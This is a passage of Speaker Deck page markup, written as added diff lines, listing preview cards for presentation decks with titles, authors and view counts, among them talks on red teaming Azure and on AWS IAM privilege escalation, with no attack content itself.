+    <a href="/tweekfawkes/blue-cloud-of-death-red-teaming-azure-saintcon" title="Blue Cloud of Death: Red Teaming Azure - SaintCon">
+      <div class="card deck-preview" data-id="0e154f3cfd14462a947f0bc2208291c7" data-slide-count="136" data-cover-image="https://files.speakerdeck.com/presentations/0e154f3cfd14462a947f0bc2208291c7/preview_slide_0.jpg?10926563">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/0e154f3cfd14462a947f0bc2208291c7/preview_slide_0.jpg?10926563');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/0e154f3cfd14462a947f0bc2208291c7/preview_slide_0.jpg?10926563');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="717 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 720</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tweekfawkes/blue-cloud-of-death-red-teaming-azure" title="Blue Cloud of Death: Red Teaming Azure">
+      <div class="card deck-preview" data-id="4284d34edbd1444ba8ed61aa9b49672f" data-slide-count="102" data-cover-image="https://files.speakerdeck.com/presentations/4284d34edbd1444ba8ed61aa9b49672f/preview_slide_0.jpg?9811612">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4284d34edbd1444ba8ed61aa9b49672f/preview_slide_0.jpg?9811612');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4284d34edbd1444ba8ed61aa9b49672f/preview_slide_0.jpg?9811612');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/18ad4afa3f7c77bd84c3300505468aa0?s=48" alt="18ad4afa3f7c77bd84c3300505468aa0?s=48" />
+              tweekfawkes
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="739 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 740</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">Other Decks in Technology</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/c/technology">
+            See All in Technology <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kanaugust/exploratory-seminar-number-42-cohort-analysis-part-1-layer-cake-chart" title="Exploratory Seminar #42 - Cohort Analysis Part 1 - Layer Cake Chart">
+      <div class="card deck-preview" data-id="88474ad6a98940de835d03f6ed97da0d" data-slide-count="98" data-cover-image="https://files.speakerdeck.com/presentations/88474ad6a98940de835d03f6ed97da0d/preview_slide_0.jpg?17972408">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/88474ad6a98940de835d03f6ed97da0d/preview_slide_0.jpg?17972408');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/88474ad6a98940de835d03f6ed97da0d/preview_slide_0.jpg?17972408');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/19fc8f6113c5c3d86e6176362ff29479?s=48" alt="19fc8f6113c5c3d86e6176362ff29479?s=48" />
+              kanaugust
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="191 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 190</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/line_developers/how-to-hold-an-easy-to-understand-presentation" title="How to hold an easy-to-understand presentation ">
+      <div class="card deck-preview" data-id="d1a93387daf04aa99586057c9eace3fc" data-slide-count="81" data-cover-image="https://files.speakerdeck.com/presentations/d1a93387daf04aa99586057c9eace3fc/preview_slide_0.jpg?18052299">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/d1a93387daf04aa99586057c9eace3fc/preview_slide_0.jpg?18052299');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/d1a93387daf04aa99586057c9eace3fc/preview_slide_0.jpg?18052299');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/53850955f15249a1a9dc49df6113e400?s=48" alt="53850955f15249a1a9dc49df6113e400?s=48" />
+              line_developers
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="600 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 600</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kjmooon/qie-cuo-zhuo-mo-suruzhong-jian-gairutocheng-chang-gabei-su-ninaru-productzineuebina-yoriyoipurodakutowozuo-rutamefalsekomiyuniteifalsehuo-yong-fa-deng-tan-zi-liao" title="切磋琢磨する仲間がいると成長が倍速になる：ProductZineウェビナー「よりよいプロダクトを作るためのコミュニティの活用法」登壇資料">
+      <div class="card deck-preview" data-id="1658453b47ac442c82a384d87c3f9286" data-slide-count="27" data-cover-image="https://files.speakerdeck.com/presentations/1658453b47ac442c82a384d87c3f9286/preview_slide_0.jpg?18121732">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/1658453b47ac442c82a384d87c3f9286/preview_slide_0.jpg?18121732');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/1658453b47ac442c82a384d87c3f9286/preview_slide_0.jpg?18121732');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/6116b6a08edb28fb78c393a1ca5c98ee?s=48" alt="6116b6a08edb28fb78c393a1ca5c98ee?s=48" />
+              kjmooon
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="152 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 150</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/1ftseabass/20210521-familytechlt-vol-dot-4" title="20210521_familytechlt_vol.4">
+      <div class="card deck-preview" data-id="336573c2c5ff4b87a4b2d04b092e43b9" data-slide-count="25" data-cover-image="https://files.speakerdeck.com/presentations/336573c2c5ff4b87a4b2d04b092e43b9/preview_slide_0.jpg?18101584">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/336573c2c5ff4b87a4b2d04b092e43b9/preview_slide_0.jpg?18101584');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/336573c2c5ff4b87a4b2d04b092e43b9/preview_slide_0.jpg?18101584');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/fecdd3417cd7375cc0bd0352d72db27e?s=48" alt="Fecdd3417cd7375cc0bd0352d72db27e?s=48" />
+              1ftseabass
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="120 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 120</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/ishiayaya/non-technical" title="Power BI for the NON-TECHnical personやってみた! / NON-TECHnical">
+      <div class="card deck-preview" data-id="d8b0b7bc50514ec994b0a90d385e55d6" data-slide-count="12" data-cover-image="https://files.speakerdeck.com/presentations/d8b0b7bc50514ec994b0a90d385e55d6/preview_slide_0.jpg?17986667">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/d8b0b7bc50514ec994b0a90d385e55d6/preview_slide_0.jpg?17986667');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/d8b0b7bc50514ec994b0a90d385e55d6/preview_slide_0.jpg?17986667');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/966e29b84ae7dbde170f66b0bc75b7a6?s=48" alt="966e29b84ae7dbde170f66b0bc75b7a6?s=48" />
+              ishiayaya
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 1
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="261 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 260</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/ta28masa/di-1hui-sawatutemiyoudsp-sandbox-shou-shun-falsemi" title="第1回 さわってみようDSP Sandbox (手順のみ)">
+      <div class="card deck-preview" data-id="b3d6c37ee9de4a44b5f38ba417d882b7" data-slide-count="42" data-cover-image="https://files.speakerdeck.com/presentations/b3d6c37ee9de4a44b5f38ba417d882b7/preview_slide_0.jpg?18053991">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/b3d6c37ee9de4a44b5f38ba417d882b7/preview_slide_0.jpg?18053991');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/b3d6c37ee9de4a44b5f38ba417d882b7/preview_slide_0.jpg?18053991');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/9a38c60104a629648564527582d071c6?s=48" alt="9a38c60104a629648564527582d071c6?s=48" />
+              ta28masa
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="296 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 300</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/inductor/resource-requests-and-limits-under-the-hood-the-journey-of-a-pod-spec" title="Resource Requests and Limits Under the Hood: The Journey of a Pod Spec">
+      <div class="card deck-preview" data-id="aa89846822494f4fb7781827b38454e5" data-slide-count="43" data-cover-image="https://files.speakerdeck.com/presentations/aa89846822494f4fb7781827b38454e5/preview_slide_0.jpg?18032033">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/aa89846822494f4fb7781827b38454e5/preview_slide_0.jpg?18032033');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/aa89846822494f4fb7781827b38454e5/preview_slide_0.jpg?18032033');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/ad22fcf5773b906c08330f4d57242212?s=48" alt="Ad22fcf5773b906c08330f4d57242212?s=48" />
+              inductor
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="509 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 510</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kfujita/me2-circuit" title="ME2種電気回路（直流）/ ME2_circuit">
+      <div class="card deck-preview" data-id="a2f34be4980c414b96c882e4e3a7385d" data-slide-count="44" data-cover-image="https://files.speakerdeck.com/presentations/a2f34be4980c414b96c882e4e3a7385d/preview_slide_0.jpg?18092049">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/a2f34be4980c414b96c882e4e3a7385d/preview_slide_0.jpg?18092049');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/a2f34be4980c414b96c882e4e3a7385d/preview_slide_0.jpg?18092049');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/4778df65a51ce0612a2c2a7ab8dfe87a?s=48" alt="4778df65a51ce0612a2c2a7ab8dfe87a?s=48" />
+              kfujita
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="130 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 130</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/phoenixhawk/await-in-net" title="Thinktecture Webinar async/await in .NET">
+      <div class="card deck-preview" data-id="46160ac7c687409e9981601e801b8b01" data-slide-count="28" data-cover-image="https://files.speakerdeck.com/presentations/46160ac7c687409e9981601e801b8b01/preview_slide_0.jpg?18087596">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/46160ac7c687409e9981601e801b8b01/preview_slide_0.jpg?18087596');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/46160ac7c687409e9981601e801b8b01/preview_slide_0.jpg?18087596');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/ebeb5d8fd081058ba8df73d378bf83d7?s=48" alt="Ebeb5d8fd081058ba8df73d378bf83d7?s=48" />
+              phoenixhawk
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="127 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 130</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/kloudleinc/iam-bad-privilege-escalation-using-misconfigured-policies-in-aws-iam-webinar" title="IAM Bad: Privilege Escalation using Misconfigured Policies in AWS IAM (Webinar)">
+      <div class="card deck-preview" data-id="765385acf44b4ce585a241b513a0abf0" data-slide-count="26" data-cover-image="https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/765385acf44b4ce585a241b513a0abf0/preview_slide_0.jpg?18013630');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/9b2600a82821673d9d0f03cc6f7bc56e?s=48" alt="9b2600a82821673d9d0f03cc6f7bc56e?s=48" />
+              kloudleinc
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 0
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="331 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 330</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/cybozuinsideout/cybozu-engineer-recruit" title="サイボウズ エンジニア採用ピッチ / Cybozu Engineer Recruit">
+      <div class="card deck-preview" data-id="5eabf6cdd9e7484988e6a0d1b8f5d957" data-slide-count="35" data-cover-image="https://files.speakerdeck.com/presentations/5eabf6cdd9e7484988e6a0d1b8f5d957/preview_slide_0.jpg?18047402">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/5eabf6cdd9e7484988e6a0d1b8f5d957/preview_slide_0.jpg?18047402');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/5eabf6cdd9e7484988e6a0d1b8f5d957/preview_slide_0.jpg?18047402');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/a97eee01397705443a72a48ce29d3e19?s=48" alt="A97eee01397705443a72a48ce29d3e19?s=48" />
+              cybozuinsideout
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 4
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="3,419 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 3.4k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/line_developers/presentation-about-how-to-hold-an-easy-to-understand-presentation" title="分かりやすく伝えるプレゼンテーション講座 / Presentation about how to hold an easy-to-understand presentation">
+      <div class="card deck-preview" data-id="cf8b19267de14187ab2dacd965597a44" data-slide-count="109" data-cover-image="https://files.speakerdeck.com/presentations/cf8b19267de14187ab2dacd965597a44/preview_slide_0.jpg?18053429">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/cf8b19267de14187ab2dacd965597a44/preview_slide_0.jpg?18053429');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/cf8b19267de14187ab2dacd965597a44/preview_slide_0.jpg?18053429');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/53850955f15249a1a9dc49df6113e400?s=48" alt="53850955f15249a1a9dc49df6113e400?s=48" />
+              line_developers
+            </div>
+              <div class="pr-2 mr-auto py-3">
+                  <div class="badge badge-pro ">PRO</div>
+
+              </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 9
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="1,259 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 1.3k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+
+      <div class="row mb-4 align-items-center">
+        <div class="col-12 col-lg-9 mb-3 mb-lg-0">
+          <h2 class="m-0">Featured</h2>
+        </div>
+        <div class="col-12 col-lg-3 text-lg-right">
+          <a class="btn btn-outline-primary" href="/p/featured">
+            See All Featured <svg class="icon icon-chevron-right "><use xlink:href="/icons/icons.svg#icon-chevron-right"></use></svg>
+</a>        </div>
+      </div>
+      <div class="row">
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/smashingmag/the-invisible-side-of-design" title="The Invisible Side of Design">
+      <div class="card deck-preview" data-id="4e94aa54fcba560051000c3c" data-slide-count="126" data-cover-image="https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/b3d6434763caa0ef5dc4b792662c49f7?s=48" alt="B3d6434763caa0ef5dc4b792662c49f7?s=48" />
+              smashingmag
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 283
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="46,805 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 47k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/sachag/side-projects" title="Side Projects">
+      <div class="card deck-preview" data-id="508b4413c21140000200a7b7" data-slide-count="50" data-cover-image="https://files.speakerdeck.com/presentations/508b4413c21140000200a7b7/preview_slide_0.jpg?51170">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/508b4413c21140000200a7b7/preview_slide_0.jpg?51170');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/508b4413c21140000200a7b7/preview_slide_0.jpg?51170');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/027d1ebf66cc039a0bd3b55eeadbe75d?s=48" alt="027d1ebf66cc039a0bd3b55eeadbe75d?s=48" />
+              sachag
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 446
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="35,909 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 36k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/geeforr/whats-new-in-ruby-2-dot-0" title="What&#39;s new in Ruby 2.0">
+      <div class="card deck-preview" data-id="f080c130744c01306b5122000a1c8083" data-slide-count="39" data-cover-image="https://files.speakerdeck.com/presentations/f080c130744c01306b5122000a1c8083/preview_slide_0.jpg?1212457">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/f080c130744c01306b5122000a1c8083/preview_slide_0.jpg?1212457');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/f080c130744c01306b5122000a1c8083/preview_slide_0.jpg?1212457');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/7edec06b5435e0dac07a353b2cc26253?s=48" alt="7edec06b5435e0dac07a353b2cc26253?s=48" />
+              geeforr
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 333
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="29,354 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 29k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/philhawksworth/web-development-in-the-modern-age" title="Web development in the modern age">
+      <div class="card deck-preview" data-id="92175a9012ce0131eee8569080c4c5ad" data-slide-count="107" data-cover-image="https://files.speakerdeck.com/presentations/92175a9012ce0131eee8569080c4c5ad/preview_slide_0.jpg?2085044">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/92175a9012ce0131eee8569080c4c5ad/preview_slide_0.jpg?2085044');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/92175a9012ce0131eee8569080c4c5ad/preview_slide_0.jpg?2085044');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
